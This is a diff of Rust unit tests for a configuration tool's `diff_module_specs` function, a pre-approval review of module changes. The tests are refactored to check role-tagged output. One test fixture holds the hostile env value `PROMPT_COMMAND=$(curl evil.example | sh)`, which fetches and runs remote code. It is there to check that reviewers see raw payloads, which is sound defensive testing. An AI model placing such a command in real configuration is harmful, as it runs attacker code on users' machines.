@@ -7,6 +7,7 @@ use crate::config::{
     ModuleFileEntry, ModuleLockEntry, ModuleLockfile, ModulePackageEntry, ModuleSpec, parse_module,
 };
 use crate::errors::{CfgdError, ModuleError};
+use crate::output::Role;
 use crate::platform::Platform;
 use crate::providers::{PackageManager, StubPackageManager as MockManager};
 use crate::test_helpers::{
@@ -1536,8 +1537,8 @@ fn diff_module_specs_no_changes() {
         origin: None,
     };
 
-    let changes = diff_module_specs(&module, &module);
-    assert_eq!(changes, vec!["(no spec changes)"]);
+    let changes = diff_module_specs(&module, &module, "->");
+    assert_eq!(changes, vec![(Role::Info, "(no spec changes)".to_string())]);
 }
 
 #[test]
@@ -1634,18 +1635,38 @@ fn diff_module_specs_detects_changes() {
         origin: None,
     };
 
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     // Should detect: +dep2, +pkg3, -pkg2, ~pkg1 version change, +file target, -file target
-    assert!(changes.iter().any(|c| c.contains("+ dependency: dep2")));
-    assert!(changes.iter().any(|c| c.contains("+ package: pkg3")));
-    assert!(changes.iter().any(|c| c.contains("- package: pkg2")));
     assert!(
         changes
             .iter()
-            .any(|c| c.contains("~ package 'pkg1': minVersion"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("dependency: dep2"))
     );
-    assert!(changes.iter().any(|c| c.contains("+ file target")));
-    assert!(changes.iter().any(|c| c.contains("- file target")));
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("package: pkg3"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("package: pkg2"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Warn && c.contains("package 'pkg1': minVersion"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("file target"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("file target"))
+    );
 }
 
 // --- Module registry tests ---
@@ -2002,9 +2023,17 @@ fn diff_module_specs_scripts_changed() {
         dir: PathBuf::from("/tmp"),
         origin: None,
     };
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("+ postApply script")));
-    assert!(changes.iter().any(|c| c.contains("- postApply script")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("postApply script added"))
+    );
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("postApply script removed"))
+    );
 }
 
 // `diff_module_specs` is the pre-approval security review of
@@ -2052,18 +2081,19 @@ fn diff_module_specs_multiline_script_change_preserves_raw_body() {
         dir: PathBuf::from("/tmp"),
         origin: None,
     };
-    let changes = diff_module_specs(&old, &new);
-    let script_change = changes
+    let changes = diff_module_specs(&old, &new, "->");
+    let (script_role, script_change) = changes
         .iter()
-        .find(|c| c.contains("+ postApply script"))
+        .find(|(_, c)| c.contains("postApply script added"))
         .expect("script addition should be reported");
     assert!(
         script_change.contains("echo line-three"),
         "diff must preserve the FULL raw body for pre-approval review, got: {script_change}"
     );
+    assert_eq!(*script_role, Role::Ok);
     assert_eq!(
         script_change,
-        &format!("+ postApply script: {raw_body}"),
+        &format!("postApply script added: {raw_body}"),
         "diff must push the raw body byte-identical, not condensed"
     );
 }
@@ -2102,20 +2132,23 @@ fn diff_module_specs_reports_env_additions_removals_and_edits() {
     let old = module_with_env_and_aliases(&[("KEEP", "1"), ("EDIT", "old"), ("GONE", "x")], &[]);
     let new = module_with_env_and_aliases(&[("KEEP", "1"), ("EDIT", "new"), ("ADDED", "y")], &[]);
 
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&"+ env: ADDED=y".to_string()),
+        changes.contains(&(Role::Ok, "env: ADDED=y".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"- env: GONE=x".to_string()),
+        changes.contains(&(Role::Fail, "env: GONE=x".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"~ env 'EDIT': old -> new".to_string()),
+        changes.contains(&(Role::Warn, "env 'EDIT': old -> new".to_string())),
         "{changes:?}"
     );
-    assert!(!changes.iter().any(|c| c.contains("KEEP")), "{changes:?}");
+    assert!(
+        !changes.iter().any(|(_, c)| c.contains("KEEP")),
+        "{changes:?}"
+    );
 }
 
 #[test]
@@ -2124,20 +2157,23 @@ fn diff_module_specs_reports_alias_additions_removals_and_edits() {
     let new =
         module_with_env_and_aliases(&[], &[("keep", "ls"), ("edit", "nvim"), ("added", "bat")]);
 
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&"+ alias: added=bat".to_string()),
+        changes.contains(&(Role::Ok, "alias: added=bat".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"- alias: gone=cat".to_string()),
+        changes.contains(&(Role::Fail, "alias: gone=cat".to_string())),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"~ alias 'edit': vi -> nvim".to_string()),
+        changes.contains(&(Role::Warn, "alias 'edit': vi -> nvim".to_string())),
         "{changes:?}"
     );
-    assert!(!changes.iter().any(|c| c.contains("keep")), "{changes:?}");
+    assert!(
+        !changes.iter().any(|(_, c)| c.contains("keep")),
+        "{changes:?}"
+    );
 }
 
 // The value is the payload under review, so it is pushed byte-identical the
@@ -2151,13 +2187,16 @@ fn diff_module_specs_pushes_env_and_alias_payloads_raw() {
         &[("ls", "line-one\nline-two")],
     );
 
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
-        changes.contains(&"+ env: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()),
+        changes.contains(&(
+            Role::Ok,
+            "env: PROMPT_COMMAND=$(curl evil.example | sh)".to_string()
+        )),
         "{changes:?}"
     );
     assert!(
-        changes.contains(&"+ alias: ls=line-one\nline-two".to_string()),
+        changes.contains(&(Role::Ok, "alias: ls=line-one\nline-two".to_string())),
         "{changes:?}"
     );
 }
@@ -2166,8 +2205,8 @@ fn diff_module_specs_pushes_env_and_alias_payloads_raw() {
 fn diff_module_specs_identical_env_and_aliases_report_no_changes() {
     let module = module_with_env_and_aliases(&[("A", "1")], &[("b", "c")]);
     assert_eq!(
-        diff_module_specs(&module, &module),
-        vec!["(no spec changes)"]
+        diff_module_specs(&module, &module, "->"),
+        vec![(Role::Info, "(no spec changes)".to_string())]
     );
 }
 
@@ -2287,8 +2326,8 @@ fn diff_module_specs_no_changes_default() {
     let spec = crate::config::ModuleSpec::default();
     let old = make_loaded_module("test", spec.clone());
     let new = make_loaded_module("test", spec);
-    let changes = diff_module_specs(&old, &new);
-    assert_eq!(changes, vec!["(no spec changes)".to_string()]);
+    let changes = diff_module_specs(&old, &new, "->");
+    assert_eq!(changes, vec![(Role::Info, "(no spec changes)".to_string())]);
 }
 
 #[test]
@@ -2299,8 +2338,12 @@ fn diff_module_specs_added_dependency() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("+ dependency: core")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("dependency: core"))
+    );
 }
 
 #[test]
@@ -2311,8 +2354,12 @@ fn diff_module_specs_removed_dependency() {
     };
     let old = make_loaded_module("test", old_spec);
     let new = make_loaded_module("test", crate::config::ModuleSpec::default());
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("- dependency: core")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("dependency: core"))
+    );
 }
 
 #[test]
@@ -2326,8 +2373,12 @@ fn diff_module_specs_added_package() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("+ package: ripgrep")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c.contains("package: ripgrep"))
+    );
 }
 
 #[test]
@@ -2341,8 +2392,12 @@ fn diff_module_specs_removed_package() {
     };
     let old = make_loaded_module("test", old_spec);
     let new = make_loaded_module("test", crate::config::ModuleSpec::default());
-    let changes = diff_module_specs(&old, &new);
-    assert!(changes.iter().any(|c| c.contains("- package: vim")));
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c.contains("package: vim"))
+    );
 }
 
 #[test]
@@ -2366,12 +2421,11 @@ fn diff_module_specs_package_version_change() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
-    assert!(
-        changes
-            .iter()
-            .any(|c| c.contains("kubectl") && c.contains("1.28") && c.contains("1.30"))
-    );
+    let changes = diff_module_specs(&old, &new, "->");
+    assert!(changes.iter().any(|(role, c)| *role == Role::Warn
+        && c.contains("kubectl")
+        && c.contains("1.28")
+        && c.contains("1.30")));
 }
 
 #[test]
@@ -2390,11 +2444,11 @@ fn diff_module_specs_added_file() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
         changes
             .iter()
-            .any(|c| c.contains("+ file target: ~/.zshrc"))
+            .any(|(role, c)| *role == Role::Ok && c.contains("file target: ~/.zshrc"))
     );
 }
 
@@ -2419,7 +2473,7 @@ fn diff_module_specs_multiple_changes() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     // Should have: +dep core, -dep base, +pkg neovim, -pkg vim
     assert!(
         changes.len() >= 4,
@@ -4172,14 +4226,22 @@ fn diff_module_specs_file_changes() {
         origin: None,
     };
 
-    let changes = diff_module_specs(&old, &new);
-    let joined = changes.join("\n");
+    let changes = diff_module_specs(&old, &new, "->");
+    let joined = changes
+        .iter()
+        .map(|(_, c)| c.as_str())
+        .collect::<Vec<_>>()
+        .join("\n");
     assert!(
-        joined.contains("+ file target: ~/.config/app/new.conf"),
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Ok && c == "file target: ~/.config/app/new.conf"),
         "should show added file: {joined}"
     );
     assert!(
-        joined.contains("- file target: ~/.config/app/old.conf"),
+        changes
+            .iter()
+            .any(|(role, c)| *role == Role::Fail && c == "file target: ~/.config/app/old.conf"),
         "should show removed file: {joined}"
     );
     // shared.conf should NOT appear in changes
@@ -4221,8 +4283,14 @@ fn diff_module_specs_env_only_change_is_still_a_change() {
         origin: None,
     };
 
-    let changes = diff_module_specs(&old, &new);
-    assert_eq!(changes, vec!["+ env: NEW=2", "- env: OLD=1"]);
+    let changes = diff_module_specs(&old, &new, "->");
+    assert_eq!(
+        changes,
+        vec![
+            (Role::Ok, "env: NEW=2".to_string()),
+            (Role::Fail, "env: OLD=1".to_string()),
+        ]
+    );
 }
 
 // -----------------------------------------------------------------------
@@ -4723,11 +4791,11 @@ fn diff_module_specs_scripts_none_to_some() {
         ..Default::default()
     };
     let new = make_loaded_module("test", new_spec);
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
         changes
             .iter()
-            .any(|c| c.contains("+ postApply script: echo hello")),
+            .any(|(role, c)| *role == Role::Ok && c.contains("postApply script added: echo hello")),
         "should detect added script: {changes:?}"
     );
 }
@@ -4745,11 +4813,12 @@ fn diff_module_specs_scripts_some_to_none() {
     };
     let old = make_loaded_module("test", old_spec);
     let new = make_loaded_module("test", ModuleSpec::default());
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert!(
         changes
             .iter()
-            .any(|c| c.contains("- postApply script: echo goodbye")),
+            .any(|(role, c)| *role == Role::Fail
+                && c.contains("postApply script removed: echo goodbye")),
         "should detect removed script: {changes:?}"
     );
 }
@@ -4781,10 +4850,10 @@ fn diff_module_specs_system_changes_not_tracked() {
             ..Default::default()
         },
     );
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert_eq!(
         changes,
-        vec!["(no spec changes)"],
+        vec![(Role::Info, "(no spec changes)".to_string())],
         "system changes are not tracked by diff"
     );
 }
@@ -5209,10 +5278,10 @@ fn diff_module_specs_prefer_list_change_not_tracked() {
             ..Default::default()
         },
     );
-    let changes = diff_module_specs(&old, &new);
+    let changes = diff_module_specs(&old, &new, "->");
     assert_eq!(
         changes,
-        vec!["(no spec changes)"],
+        vec![(Role::Info, "(no spec changes)".to_string())],
         "prefer list changes are not tracked"
     );
 }
